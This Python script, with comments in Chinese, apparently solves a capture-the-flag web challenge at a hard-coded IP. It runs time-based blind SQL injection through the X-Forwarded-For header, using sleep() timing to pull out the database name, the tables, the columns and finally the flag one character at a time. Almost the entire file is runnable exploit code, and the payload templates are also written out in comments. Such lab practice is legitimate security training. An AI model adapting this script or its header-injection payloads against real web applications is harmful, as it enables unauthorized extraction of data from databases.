# -*- coding:utf-8 -*-

import requests
from _operator import index
from _ast import Index

#payload
#盲注数据库名长度
#123'+(select case when length((select database()))=1 then sleep(5) else 0 end) and '1'='1

#盲注数据库名称
#123'+(select case when substring((select database()) from 1 for 1)='a' then sleep(5) else 0 end) and '1'='1

#盲注表数量
#123'+(select case when (select count(*) from information_schema.tables where table_schema=database())>1 then sleep(5) else 0 end) and '1'='1

#盲注表名
#123'+(select case when substring((select table_name from information_schema.tables where table_schema=database()) from 1 for 1)='n' then sleep(5) else 0 end) and '1'='1
get_url = 'http://123.206.87.240:8002/web15/'

#获取数据库长度
def get_db_len():
    for i in range(1,21):
        payload = '123\'+(select case when length((select database()))=' + str(i) + ' then sleep(5) else 0 end) and \'1\'=\'1'
        head = {'X-Forwarded-For':payload}
        try:
            requests.get(get_url, headers=head, timeout=3)
        except requests.exceptions.ReadTimeout:
            return i
# print(get_db_len())

#获取数据库名称单个字符
def get_db_name(index):
    wildcard = '123456789abcdefghijklmnopqrstuvwxyz~!@#$%^&*()_+-='
    for ch in wildcard:
        payload = '123\'+(select case when substring((select database()) from ' + str(index) + ' for 1)=\'' + ch + '\' then sleep(5) else 0 end) and \'1\'=\'1'
        head = {'X-Forwarded-For':payload}
        try:
            requests.get(get_url, headers=head, timeout=3)
        except requests.exceptions.ReadTimeout:
            return ch

#获取表数量
def get_tb_count():
    for i in range(1,21):
        payload = '123\'+(select case when (select count(*) from information_schema.tables where table_schema=database())=' + str(i) + ' then sleep(5) else 0 end) and \'1\'=\'1'
        head = {'X-Forwarded-For':payload}
        try:
            requests.get(get_url, headers=head, timeout=3)
        except requests.exceptions.ReadTimeout:
            return i
#print(get_tb_count())

def get_tb_len():   #length 14
    for i in range(1,21):
        payload = '123\'+(select case when length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=' + str(i) + ' then sleep(5) else 0 end) and \'1\'=\'1'
        head = {'X-Forwarded-For':payload}
        try:
            requests.get(get_url, headers=head, timeout=3)
        except requests.exceptions.ReadTimeout:
            return i



#获取表名
def get_tb_name(index): #client_ip flag
    wildcard = '123456789abcdefghijklmnopqrstuvwxyz~!@#$%^&*()_+-='
    for ch in wildcard:
        payload = '123\'+(select case when substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from ' + str(index) + ' for 1)=\'' + ch + '\' then sleep(5) else 0 end) and \'1\'=\'1'
        head = {'X-Forwarded-For':payload}
        try:
            requests.get(get_url, headers=head, timeout=3)
        except requests.exceptions.ReadTimeout:
            return ch
#print(get_tb_name(1))
# tb_name = ''
# for i in range(1,15):
#     print(get_tb_name(i),end='')

#获得字段长度
def get_field_len():    #4
    for i in range(1,21):
        payload = '123\'+(select case when length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\'flag\'))=' + str(i) + ' then sleep(5) else 0 end) and \'1\'=\'1'
        head = {'X-Forwarded-For':payload}
        try:
            requests.get(get_url, headers=head, timeout=3)
        except requests.exceptions.ReadTimeout:
            return i

# print(get_field_len())
#字段名字
def get_field_name(index):  #flag
    wildcard = '123456789abcdefghijklmnopqrstuvwxyz~!@#$%^&*()_+-='
    for ch in wildcard:
        payload = '123\'+(select case when substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\'flag\') from ' + str(index) + ' for 1)=\'' + ch + '\' then sleep(5) else 0 end) and \'1\'=\'1'
        head = {'X-Forwarded-For':payload}
        try:
            requests.get(get_url, headers=head, timeout=3)
        except requests.exceptions.ReadTimeout:
            return ch
# 
# for i in range(1,5):
#     print(get_field_name(i))
    
def get_flag_len(): #32
    for i in range(1,100):
        payload = '123\'+(select case when length((select group_concat(flag) from flag))=' + str(i) + ' then sleep(5) else 0 end) and \'1\'=\'1'
        head = {'X-Forwarded-For':payload}
        try:
            requests.get(get_url, headers=head, timeout=3)
        except requests.exceptions.ReadTimeout:
            return i

def get_flag(index):
    wildcard = '123456789abcdefghijklmnopqrstuvwxyz~!@#$%^&*()_+-='
    for ch in wildcard:
        payload = '123\'+(select case when (substring((select group_concat(flag) from flag) from {0} for 1))=\'{1}\' then sleep(11) else 0 end) and \'1\'=\'1'
        head = {'X-Forwarded-For':payload.format(str(index), ch)}
        #print('payload:', payload)
        try:
            requests.get(get_url, headers=head, timeout=9)
        except requests.exceptions.ReadTimeout:
            return ch
flag = ''
for i in range(1,33):
    flag += get_flag(i)
    print(flag)
#print('flag',flag)
# db_name_len = get_db_len() + 1
# db_name = ''
# for i in range(1,db_name_len):
#     db_name += get_db_name(i)
# 
# print('db_name:', db_name)

